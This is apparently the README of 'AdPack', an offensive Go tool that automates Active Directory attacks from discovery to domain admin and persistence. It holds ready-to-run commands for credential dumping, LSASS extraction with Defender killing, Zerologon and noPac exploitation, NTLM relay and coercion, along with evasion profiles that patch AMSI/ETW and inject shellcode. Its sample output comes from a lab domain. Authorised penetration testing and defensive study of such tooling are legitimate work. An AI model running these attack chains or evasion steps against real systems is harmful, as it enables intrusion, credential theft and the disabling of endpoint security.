<p align="center">
  <img src="AdPackBanner.jpg" alt="AdPack Banner" width="100%">
</p>

<h3 align="center">State-aware Active Directory attack orchestration</h3>

<p align="center">
  <a href="LICENSE">
    <img src="https://img.shields.io/badge/License-MIT-white?style=for-the-badge&logo=opensourceinitiative&logoColor=black" alt="License">
  </a>
  <a href="https://go.dev">
    <img src="https://img.shields.io/badge/Go-1.25+-black?style=for-the-badge&logo=go&logoColor=white" alt="Go">
  </a>
  <img src="https://img.shields.io/badge/Platform-Linux%20%7C%20WSL-white?style=for-the-badge&logo=linux&logoColor=black" alt="Platform">
  <img src="https://img.shields.io/badge/Version-0.4.0-black?style=for-the-badge&logo=semver&logoColor=white" alt="Version">
</p>

<p align="center">
  <a href="#-quick-start"><img src="https://img.shields.io/badge/Quick_Start-black?style=for-the-badge" alt="Quick Start"></a>
  <a href="#-features"><img src="https://img.shields.io/badge/Features-white?style=for-the-badge" alt="Features"></a>
  <a href="#-evasion-profiles"><img src="https://img.shields.io/badge/Evasion-black?style=for-the-badge" alt="Evasion"></a>
  <a href="#-documentation"><img src="https://img.shields.io/badge/Docs-white?style=for-the-badge" alt="Docs"></a>
  <a href="#-installation"><img src="https://img.shields.io/badge/Install-black?style=for-the-badge" alt="Install"></a>
</p>

<br>

> Authorised Use Only — This tool is for legitimate security assessments and penetration testing with explicit written authorisation. Unauthorised access to computer systems is illegal.

<br>

## Overview

Adpack runs AD attacks through 9 phases. It tracks hosts, users, creds, and sessions in SQLite, detects gaps, suggests next steps, and goes from recon to domain admin.

### Quick Start

```bash
git clone https://github.com/Yenn503/AdPack.git
cd adpack && ./setup.sh && source ~/.bashrc

# Automated attack chain — seed creds, execute privesc paths
adpack autorun --target 192.168.57.22 \
  --domain north.sevenkingdoms.local \
  --user samwell.tarly --password Heartsbane \
  --execute --skip-fail
```

### Example Output

```
  ────────────────────────────────────────────────────
  AUTO-RUN  ·  Automated Attack Chain
  Target:  192.168.57.22
  ────────────────────────────────────────────────────

  →  Seeded creds: north.sevenkingdoms.local\samwell.tarly

  ── [1] DISCOVERY ───────────────────────────────────
[+] Host added from target flag: 192.168.57.22
[+] Discovered host: KINGSLANDING (192.168.57.10) [DC]
[+] Discovered host: WINTERFELL (192.168.57.11) [DC]
  ✓  3 host(s) discovered

  ── [2] ENUMERATION ─────────────────────────────────
[*] Enumerating users on 192.168.57.11 ...
[+] Enumerated 16 users
[+] Found 1 credential(s) in user descriptions
  ✓  16 user(s) enumerated

  ── [3] CREDENTIAL_ACQ ──────────────────────────────
[*] AS-REP: 1 roastable users found
[*] Kerberoast: 9 SPN accounts found

  ── [6] GRAPH_ANALYSIS ──────────────────────────────
[+] 2 computers, 3 GPOs, 33 ADCS templates

  ── [7] LATERAL ─────────────────────────────────────
  ✓  SMB-WMI succeeded   ✓  SMB-PSExec succeeded
  ✓  WinRM succeeded     ✓  MSSQL-xpcmd succeeded

  ── [9] PRIVESC ─────────────────────────────────────
  ✓  Responder started (LLMNR/NBT-NS/WPAD poisoning)
  ✓  NTLM relay started → ldap://192.168.57.22
  ✓  BloodHound merged: 21 users, 51 groups, 4 computers
  ✓  SYSTEM confirmed on CASTELBLACK (MSSQL XMP_CMDSHELL)
  ✓  UnDefend --kill executed (Defender disabled)
  ✓  3 credentials from SAM dump

  ── [12] PERSISTENCE ────────────────────────────────
[+] Scheduled task persistence created (onlogon, SYSTEM)

  ✓  All phases complete or blocked. Review state.
  ■  12 phases  ·  3 hosts  ·  21 users  ·  5 creds (4 validated)

  CREDENTIALS  (5 total, 4 validated)
    ·  north.sevenkingdoms.local\samwell.tarly  Heartsbane  ✓
    ·  north.sevenkingdoms.local\Administrator  dbd13e1c4...  ✓
    ·  north.sevenkingdoms.local\vagrant       e02bc5033...  ✓

  HOSTS  (3 total)
    ·  192.168.57.22  CASTELBLACK [COMPROMISED]
    ·  192.168.57.10  KINGSLANDING [DC]
    ·  192.168.57.11  WINTERFELL [DC]

  PRIVILEGE EDGES  (473 total)
    ·  GenericAll x133 ·  GenericWrite x81 ·  WriteDacl x83
    ·  ADCS_ESC1 x1 ·  ADCS_ESC13 x2 ·  UNCONSTRAINED_DELEGATION x1
    ·  MSSQL_XP_CMDSHELL x1 ·  MSSQL_LINKED_SERVER x1
    ·  MemberOf x37 ·  AdminTo x10 ·  AddKeyCredentialLink x12
```

### Manual Workflow

```bash
adpack status                          # View current state and gaps
adpack run discovery -t 10.0.0.5       # Find domain controllers
adpack run enumeration -t 10.0.0.5     # Enumerate users and computers
adpack run credential_acq -t 10.0.0.5  # Extract credentials
adpack validate                        # Test creds across protocols
adpack run lateral -t 10.0.0.6         # Lateral movement
```

See [USAGE.md](docs/USAGE.md) for the full command reference.

---

## Features

### Orchestration
- Tracks state across phases, detects missing prerequisites
- Auto-run mode chains phases together with depth limits
- Resume partially-completed phases with `--resume`
- Dry-run mode with `--dry-run` to preview before executing
- Scope enforcement via CIDR whitelist in config
- Colour-coded CLI output with Lipgloss styling
- TUI dashboard via `adpack interactive`

### Credential Operations
- Cascading credential dump: go-mimikatz → nanodump+pypykatz → nxc SAM/LSA (graceful degradation)
- Automatic AV kill: UnDefend --kill deploys post-SYSTEM
- Kerberoasting and AS-REP roasting with automatic hash capture
- Hash cracking pipeline via hashcat (NTLM, krb5tgs, krb5asrep)
- Multi-protocol validation across SMB, LDAP, WinRM, RDP
- Detects admin rights and lateral movement viability

### Evasion
- 3 evasion profiles: `standard` (Donut + go-mimikatz), `bypass` (UnDefend pre-flight), `custom`
- Automatic AV kill after SYSTEM access via UnDefend
- In-memory execution via Donut shellcode injection
- Internal credential acquisition pipeline supports PPLShade, EDR-Freeze, PhantomKiller as fallback stages
- See the [evasion profiles table](#evasion-profiles) below

### Transport Interface
Commands execute through a pluggable `Transport` interface supporting SMB, WinRM, and WMI exec methods with automatic failover. The default `local` transport uses the operator's own network position. **Sliver C2 transport** is available for executing commands through Sliver implants (`internal/transport/sliver/`). Custom transports can be swapped in for any C2 framework.

### Cracking Pipeline
Extracted hashes (NTLM, Kerberoast, AS-REP) are automatically enqueued into a background hashcat worker pool. Cracked credentials materialise into the state database and trigger re-evaluation of privesc paths.

---

## Attack Phases

9 phases from recon to persistence:

<div align="center">

<table>
<tr>
<td align="center"><strong>01. Discovery</strong><br><sub>Find domain controllers and network topology</sub></td>
<td align="center">→</td>
<td align="center"><strong>02. Enumeration</strong><br><sub>Collect users, computers, groups via LDAP</sub></td>
<td align="center">→</td>
<td align="center"><strong>03. Credential Acquisition</strong><br><sub>Extract creds using selected evasion profile</sub></td>
</tr>
<tr>
<td colspan="5" align="center">↓</td>
</tr>
<tr>
<td align="center"><strong>04. Session Harvesting</strong><br><sub>Find active user sessions on domain systems</sub></td>
<td align="center">→</td>
<td align="center"><strong>05. Graph Analysis</strong><br><sub>Map attack paths with BloodHound</sub></td>
<td align="center">→</td>
<td align="center"><strong>06. Lateral Movement</strong><br><sub>Move between systems using validated creds</sub></td>
</tr>
<tr>
<td colspan="5" align="center">↓</td>
</tr>
<tr>
<td align="center"><strong>07. Validation</strong><br><sub>Test creds across SMB, LDAP, WinRM, RDP</sub></td>
<td align="center">→</td>
<td align="center"><strong>08. Privilege Escalation</strong><br><sub>Exploit ACLs, ADCS, RBCD, GPP misconfigs</sub></td>
<td align="center">→</td>
<td align="center"><strong>09. Persistence</strong><br><sub>Golden Ticket, DSRM, long-term access</sub></td>
</tr>
</table>

</div>

---

## Evasion Profiles

3 profiles covering the delivery strategies that matter on real engagements:

| Profile | Technique | Use Case |
|---------|-----------|----------|
| `standard` | Donut + go-mimikatz (remote exec) | Enterprise with Defender — AMSI/ETW patching, remote execution |
| `bypass` | Standard profile + UnDefend pre-flight | Full chain with automatic Defender neutralisation before dump |
| `custom` | User-defined pipeline | Custom configurations |

### Tool Provenance

| Tool | Source |
|------|--------|
| go-mimikatz | Go binary, requires Windows build |
| nanodump | Cross-compiled Go, downloaded during setup |
| UnDefend | Cross-compiled via MinGW during setup |

### Pre-conditions

- **UnDefend** — Kills Defender via service dependency exploit before dumping LSASS. Triggered by the `bypass` profile automatically.

**Example:**

```bash
adpack run credential_acq -e standard -t 10.0.0.5          # Standard LSASS dump
adpack run credential_acq -e bypass -t 10.0.0.5            # Kill Defender + dump
adpack validate                                             # Validate creds
adpack run lateral -t 10.0.0.6                             # Lateral movement
```

---

## Environment

Build environment: Windows + WSL2 (Ubuntu). Go builds, MinGW cross-compilation, and all Linux tooling run from WSL2.

Deployment: adpack is a single Go binary — compile once and deploy to any Linux host (Kali, C2 server, attack VM). Pre-built Windows tool binaries are copied alongside.

Tested on DreadGOAD-Light (3 VMware VMs, 2 forests) and VulnAD (Docker).

---

## Configuration

Create `~/.adpack/config.yaml` (or use setup.sh generated config):

```yaml
db_path: ""
nmap_args: ["-T4", "-sn"]
nxc_path: "netexec"
bh_python: "bloodhound-python"

cracking:
  hashcat_path: "/usr/bin/hashcat"
  wordlist: "/usr/share/wordlists/rockyou.txt"
  rules: ["/usr/share/hashcat/rules/best64.rule"]
  timeout_seconds: 600

viper:
  enabled: false
  host: "localhost"
  port: 7687

# Target scope: CIDR ranges allowed for attacks (optional safety net)
# scope:
#   - "10.0.0.0/8"
#   - "192.168.1.0/24"
```

Credentials are encrypted at rest using AES-GCM in the SQLite database. The encryption key is stored alongside the database file. Protect both with 600 permissions and disk encryption.

See [config.example.yaml](config.example.yaml) for the full reference.

---

## Installation

### Automated Setup

```bash
git clone https://github.com/Yenn503/AdPack.git
cd adpack
./setup.sh
source ~/.bashrc
```

Installs Go 1.25+, NetExec, Donut, pypykatz, nanodump, adpack binary, default config. Clones and builds evasion tool binaries where possible. ~5-10 minutes.

### Manual Installation

See [docs/SETUP.md](docs/SETUP.md).

---

## All Commands (v0.4.0)

| Command | Description |
|---------|-------------|
| `adpack autorun` | Full automated attack chain |
| `adpack run <phase>` | Execute a single attack phase |
| `adpack status` | Current state and gaps |
| `adpack next` | Recommended next phase |
| `adpack interactive` | TUI dashboard |
| `adpack session save/load/list/delete/export/import` | Engagement session management |
| `adpack kerb tgt/list/destroy/s4u` | Kerberos ticket management |
| `adpack adcs find/esc1-esc13/auth` | ADCS exploitation |
| `adpack zerologon check/exploit/dcsync/restore` | CVE-2020-1472 exploit |
| `adpack nopac check/exploit/dcsync/scan` | CVE-2021-42278/42287 exploit |
| `adpack coerce printerbug/petitpotam/dfscoerce/shadow/all` | NTLM coercion |
| `adpack trust list/keys/inter-realm/sidhistory` | Domain trust attacks |
| `adpack shadow ntds/ifm/parse` | NTDS.dit extraction |
| `adpack gpo create/runkey/task/localadmin/find` | GPO abuse |
| `adpack dpapi backupkey/masterkey/blob/vault/chrome/triage/credentials` | DPAPI decryption |
| `adpack gmsa list/read` | gMSA account enumeration |
| `adpack laps list` | LAPS password enumeration |
| `adpack cred list/export/status/verify` | Credential inventory |
| `adpack report html/md/json` | Engagement reports |
| `adpack validate tools/config/setup` | Validation suite |
| `adpack bloodhound collect` | BloodHound collection |
| `adpack ingest` | Import tool output |
| `adpack query` | Cypher queries |
| `adpack phases/profiles/loot/reset` | Utility commands |

## Documentation

| Doc | Description |
|-----|-------------|
| [USAGE.md](docs/USAGE.md) | Complete command reference, workflows, and examples |
| [SETUP.md](docs/SETUP.md) | Installation guide and environment setup |
| [CONTEXT.md](docs/CONTEXT.md) | Domain language, architecture, and design decisions |
| [CONTRIBUTING.md](docs/CONTRIBUTING.md) | Development guidelines and contribution process |
| [CHANGELOG.md](docs/CHANGELOG.md) | Release history |

---

## License

MIT License — see [LICENSE](LICENSE)

## Contributing

PRs welcome. Read [CONTRIBUTING.md](docs/CONTRIBUTING.md) first.
